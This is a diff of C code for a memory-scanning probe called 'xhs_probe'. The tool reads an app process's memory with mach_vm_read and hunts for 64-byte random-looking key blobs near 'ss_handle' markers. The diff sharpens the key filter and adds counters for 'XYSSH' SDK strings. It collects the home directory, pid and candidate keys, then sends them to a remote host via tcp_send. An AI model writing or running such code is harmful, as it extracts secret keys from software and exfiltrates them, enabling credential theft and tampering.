@@ -64,12 +64,13 @@ struct sockaddr_in_x {
 #define CHUNK         (256u * 1024)
 #define MAX_REGION    (64ull * 1024 * 1024)     /* 只扫 <64MB 的区 */
 #define MAX_CHUNKS    1600                      /* 上限 400MB */
-#define MAX_CAND      24
+#define MAX_CAND      16
 #define CAND_CTX      160
 
 static char *g_buf;
 static usize g_len, g_cap;
 static int   g_cand, g_chunks;
+static int   g_sdk, g_sskey;
 
 static void buf_init(void) { g_cap = 1u << 20; g_buf = (char *)malloc(g_cap); g_len = 0;
                              if (g_buf) g_buf[0] = 0; }
@@ -132,18 +133,30 @@ static void write_file(const char *text) {
     close(fd);
 }
 
-/* 廉价预筛：64 字节里前 8 字节至少 6 个不同值，且没有长 ASCII */
+/* 严格判定：64 字节必须像随机密钥，不能像指针表 */
 static int pre_ok(const unsigned char *p) {
-    int i, d = 0, run = 0, maxrun = 0;
+    int i, d = 0, run = 0, maxrun = 0, low = 0, high = 0, zero = 0;
     unsigned char seen[256];
     memset(seen, 0, sizeof(seen));
     for (i = 0; i < 64; i++) {
         if (!seen[p[i]]) { seen[p[i]] = 1; d++; }
         if (p[i] >= 0x20 && p[i] < 0x7f) { if (++run > maxrun) maxrun = run; } else run = 0;
+        if (p[i] >= 0x80) high++;
+        if (p[i] == 0) zero++;
     }
-    return (d >= 28 && maxrun <= 14);
+    for (i = 0; i + 4 <= 64; i += 4) {
+        u32 v;
+        memcpy(&v, p + i, 4);
+        if (v <= 2) low++;
+    }
+    if (low >= 2) return 0;        /* 指针表特征：满是小整数 */
+    if (zero >= 10) return 0;
+    if (maxrun > 10) return 0;
+    if (high < 18 || high > 48) return 0;
+    return (d >= 30);
 }
 
+/* 诊断：这 64 字节里是否含可读 ASCII 串片段 */
 static void *worker(void *arg) {
     const char needle[10] = {'s','s','_','h','a','n','d','l','e',0};
     const usize nlen = 9;
@@ -159,7 +172,7 @@ static void *worker(void *arg) {
     scratch = (char *)malloc(CHUNK);
     if (!scratch) return 0;
 
-    buf_str("=== xhs_probe v6 (sync) ===\n");
+    buf_str("=== xhs_probe v7 ===\n");
     {
         const char *home = getenv("HOME");
         snprintf(tmp, sizeof(tmp), "home=%s\npid=%d\n", home ? home : "(null)", getpid());
@@ -191,6 +204,13 @@ static void *worker(void *arg) {
                                        (mach_vm_address_t)(usize)scratch, &got);
                 if (kr != KERN_SUCCESS || got == 0) continue;
                 g_chunks++;
+
+                /* 统计 SDK 痕迹 */
+                for (i = 0; i + 12 < (usize)got; i++) {
+                    if (scratch[i] == 'X' && scratch[i+1] == 'Y' && scratch[i+2] == 'S' &&
+                        scratch[i+3] == 'S' && scratch[i+4] == 'H') { g_sdk++; }
+                    else if (scratch[i] == 's' && scratch[i+1] == 's' && scratch[i+2] == '_') { g_sskey++; }
+                }
 
                 for (i = 0; i + 72 < (usize)got && g_cand < MAX_CAND; i += 4) {
                     u32 mode;
@@ -234,7 +254,8 @@ static void *worker(void *arg) {
         if (g_len > g_cap - 8192) break;
     }
 
-    snprintf(tmp, sizeof(tmp), "\n=== done cands=%d chunks=%d ===\n", g_cand, g_chunks);
+    snprintf(tmp, sizeof(tmp), "\n=== done cands=%d chunks=%d sdk_str=%d ss_keys=%d ===\n",
+             g_cand, g_chunks, g_sdk, g_sskey);
     buf_str(tmp);
 
     tcp_send("PROBE2", g_buf, g_len);
